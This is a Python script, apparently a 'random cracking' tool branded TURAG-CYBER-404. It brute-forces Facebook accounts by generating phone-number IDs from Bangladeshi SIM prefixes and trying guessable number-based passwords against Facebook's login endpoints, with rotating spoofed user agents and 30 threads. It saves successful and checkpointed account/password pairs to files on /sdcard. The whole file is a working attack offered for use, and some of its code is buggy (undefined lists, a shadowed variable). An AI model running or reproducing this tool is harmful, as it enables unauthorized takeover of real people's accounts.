import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
loop = 0
oks = []
cps = []
ugen2=[]
ugen=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57','Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Vivaldi/5.7.2921.60','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Vivaldi/5.7.2921.60','Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36','Mozilla/5.0 (Android 13; Mobile; rv:68.0) Gecko/68.0 Firefox/110.0','Mozilla/5.0 (Android 13; Mobile; LG-M255; rv:110.0) Gecko/110.0 Firefox/110.0','Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/110.0.5481.114 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/110.0 Mobile/15E148 Safari/605.1.15','Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaX7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1 3gpp-gba','Mozilla/5.0 (Symbian/3; Series60/5.4 Nokia700/112.010.1404; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.2.1.20 Mobile Safari/535.1 3gpp-gba','Nokia603/112.010.1404 (Symbian/3; Series60/5.4 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 NokiaBrowser/8.2.1.20 3gpp-gba','Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaN8-00/111.040.1514; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1 3gpp-gba','Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13(Linux LLC B47)','Mozilla/5.0 (Symbian/3; Series60/5.5 Nokia808PureView/113.010.1507; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML like Gecko) NokiaBrowser/8.3.2.21 Mobile Safari/535.1 3gpp-gba','Mozilla/5.0 (Symbian/3; Series60/5.5 Nokia-603/113.010.1506; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1(KHTML, like Gecko) NokiaBrowser/8.3.2.21 Mobile Safari/535.1 3gpp-gba','Mozilla/5.0 (Symbian/3; Series60/5.4 Nokia808PureView/112.010.1506; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.2.1.21 Mobile Safari/535.1 3gpp-gba','Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/5.1.34.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13 PHLolsec/1.3.0','Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13 Edg/105.0.0.0','Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaC7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1 3gpp-gba','Mozilla/5.0 (Symbian/3; KAIOS 2.5 NokiaN8-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1 3gpp-gba','Symbian Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaE7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1','Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko)NokiaBrowser/8.5.0 Mobile Safari/534.13','Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15','Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPad; CPU OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPod touch; CPU iPhone 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1','Mozilla/5.0 (Linux; Android 11; 220233L2G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]','Mozilla/5.0 (Linux; Android 11; 220233L2G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]','Mozilla/5.0 (Linux; Android 11; 220233L2G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]','Mozilla/5.0 (Linux; Android 11; 220233L2G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]','Mozilla/5.0 (Linux; Android 11; 220233L2I Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]','Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36 OPR/71.3.3718.67322','Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.120 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/217.0.0.14.121;]','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 4 Prime) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; Redmi 4 Prime) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 4 Prime Build/OPM6.171019.030.K1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.123 Mobile Safari/537.36 EdgA/42.0.0.2314','Mozilla/5.0 (Linux; arm_64; Android 8.1.0; Redmi 4 Prime) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 YaBrowser/19.12.4.87.00 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 4 Prime Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4 Prime Build/NJH47F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4 Prime Build/NJH47B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi 4 Prime) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; PMT4238_4G_EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36','Mozilla/5.0 (Linux; Android 9; TX6s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5525.195 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; V2056A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/13.9.0.0','Mozilla/5.0 (Linux; Android 9; SM-A207M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5519.212 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 4.2.2; hu-HU; GT-S7582 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.9.900 Mobile Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 13.2; rv:110.0) Gecko/20100101 Firefox/110.0','Mozilla/5.0 (X11; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0']
cokbrut=[]
ses=requests.Session()
princp=[]
ugen=[]
uas=[]
turag=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
ugen=[]
ugen2=[]
for ua in range(500000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['4.4.4', '5.1.1' , '6.0.1' , '7.1.1' ,'8.1.0','9','9','10', '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J120H' , 'SM-J111F' , 'SM-J730G' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y','SM-J510FN' , 'SM-J200G' , 'SM-J200GU' , 'SM-J810M' , 'SM-J400M' , 'SM-J600FN' , 'SAMSUNG SM-G532G'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
logo1 = ("""
\x1b[1;90m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
\x1b[1;90m┃     \x1b[1;92m╭━━━━┳╮╱╭┳━━━┳━━━┳━━━╮   \x1b[1;90m┃
\x1b[1;90m┃     \x1b[1;92m┃╭╮╭╮┃┃╱┃┃╭━╮┃╭━╮┃╭━╮┃   \x1b[1;90m┃
\x1b[1;90m┃     \x1b[1;93m╰╯┃┃╰┫┃╱┃┃╰━╯┃┃╱┃┃┃╱╰╯   \x1b[1;90m┃
\x1b[1;90m┃     \x1b[1;93m╱╱┃┃╱┃┃╱┃┃╭╮╭┫╰━╯┃┃╭━╮   \x1b[1;90m┃
\x1b[1;90m┃     \x1b[1;92m╱╱┃┃╱┃╰━╯┃┃┃╰┫╭━╮┃╰┻━┃   \x1b[1;90m┃
\x1b[1;90m┃     \x1b[1;92m╱╱╰╯╱╰━━━┻╯╰━┻╯╱╰┻━━━╯   \x1b[1;90m┃
\x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
\033[1;96m═════════════════════════════════════════════
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: TURAG AHAMED
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mTURAG-CYBER-404
\x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;95mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM / \x1b[1;95mPREMIUM
\x1b[1;36m{+} \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m1.0.0
\033[1;96m═════════════════════════════════════════════
""")
logo = ("""
\x1b[1;90m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
\x1b[1;90m┃     \x1b[1;92m╭━━━━┳╮╱╭┳━━━┳━━━┳━━━╮   \x1b[1;90m┃
\x1b[1;90m┃     \x1b[1;92m┃╭╮╭╮┃┃╱┃┃╭━╮┃╭━╮┃╭━╮┃   \x1b[1;90m┃
\x1b[1;90m┃     \x1b[1;93m╰╯┃┃╰┫┃╱┃┃╰━╯┃┃╱┃┃┃╱╰╯   \x1b[1;90m┃
\x1b[1;90m┃     \x1b[1;93m╱╱┃┃╱┃┃╱┃┃╭╮╭┫╰━╯┃┃╭━╮   \x1b[1;90m┃
\x1b[1;90m┃     \x1b[1;92m╱╱┃┃╱┃╰━╯┃┃┃╰┫╭━╮┃╰┻━┃   \x1b[1;90m┃
\x1b[1;90m┃     \x1b[1;92m╱╱╰╯╱╰━━━┻╯╰━┻╯╱╰┻━━━╯   \x1b[1;90m┃
\x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
\033[1;96m═════════════════════════════════════════════
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: TURAG AHAMED
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mTURAG-CYBER-404
\x1b[1;36m{+} \x1b[1;93mTOOL / \x1b[1;92mSTATUS    \x1b[1;97m : \x1b[1;93mRANDOM / \x1b[1;92mACTIVE
\x1b[1;36m{+} \x1b[1;90mTOOL VIRSION      \x1b[1;97m: \x1b[1;90m1.0.0
\033[1;96m═════════════════════════════════════════════
""")
def linex():
	print(45*'\033[1;31m═\033[1;37m')

def clear():
    os.system('clear')
    print(logo)

def turag():
    clear()
    bal = input(" [+] INPUT YOUR NAME => ")
    clear()
    print(' [+] SIM CODE BD=> 016•017•018•019')
    linex()
    sexe = input('\n\033[1;32m [\033[1;32m?\033[1;32m] SIM CODE : ')
    sexex = ''.join(random.choice(string.digits) for _ in range(2))
    sex = ''.join(random.choice(string.digits) for _ in range(2))
    clear()
    print(' [+] 2000•5000•10000•15000•50000')
    linex()
    limit = int(input('\n [?] ENTER YOUR CRACK LIMIT : '))
    for nmp in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(4))
        turag.append(nmp)
    with ThreadPool(max_workers=30) as turag:
        clear()
        os.system('clear')
        print(logo)
        tl = str(len(turag))
        print('\033[1;96m [+] \033[1;33m YOUR NAME : \033[1;32m'+bal );print('\033[1;96m [+] \033[1;33m YOUR COUNTRY CODE :\033[1;32m '+sexe);print(f'\033[1;96m [+] \033[1;33m TOTAL IDz: \033[1;32m'+tl+'\n\033[1;96m [+] \033[1;33m \033[1;33mMETHOD : \033[1;32mM1\033[1;37m');print(f"\033[1;96m [+] \033[1;33m\033[1;36m USE FLIGHT MODE FOR MORE SPEED\033[1;37m");print(45*'\033[1;31m═\033[1;37m')
        for guru in turag:
            uid = sexe+sexex+sex+guru
            pwx = [sexe+sexex+sex+guru,sex+guru,sexex+guru,sexe+sexex+sex]
            turag.submit(rcrack1,uid,pwx,tl)
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;97mTURAG\033[1;97m] %s'%(loop)),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&refsrc=deprecated&_rdr').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
    'method': 'POST',
    'scheme': 'https', 
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'dbln=%7B%22100074640285700%22%3A%22BAbLQxyZ%22%2C%22100080418905311%22%3A%22VTTf3bcM%22%2C%22100076311454306%22%3A%22Rzr0rQk8%22%7D; sb=PqRlZAf2_dNhb-1Q2lJX4UoH; datr=PqRlZC0axyhsrVl1D_263ntu; locale=en_US; wd=1366x635; fr=02Kevpdd8oLoPGJlI.AWU70TAPpQfWkSJJF5zzoyBNP18.Bkgb1v.rQ.AAA.0.0.Bkgce-.AWX3Y8SOg8c',
    'origin': 'https://t.facebook.com',
    'referer': 'https://t.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'sec-ch-ua-full-version-list': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.110", "Google Chrome";v="114.0.5735.110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '811',}
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2F&amp;refsrc=deprecated&amp;lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                idf = re.findall('c_user=(.*);xs', coki)[0]
                print(f' \033[38;5;46m[TURAG-OK] {idf} | {ps}')
                open('/sdcard/TURAG-OK.txt','a').write(idf+'|'+ps+'\n')
                ok.append(idf)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                idf = "1000"+coki1[0:11]
                print(f' \033[1;31m[TURAG-CP] {idf} | {ps}' ' \n\033[1;33m [🍎] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/TURAG-CP','a').write(idf+'|'+ps+'\n')
                cp.append(idf)
                break
            else:
                continue
        loop+=1
    except:
        pass
turag()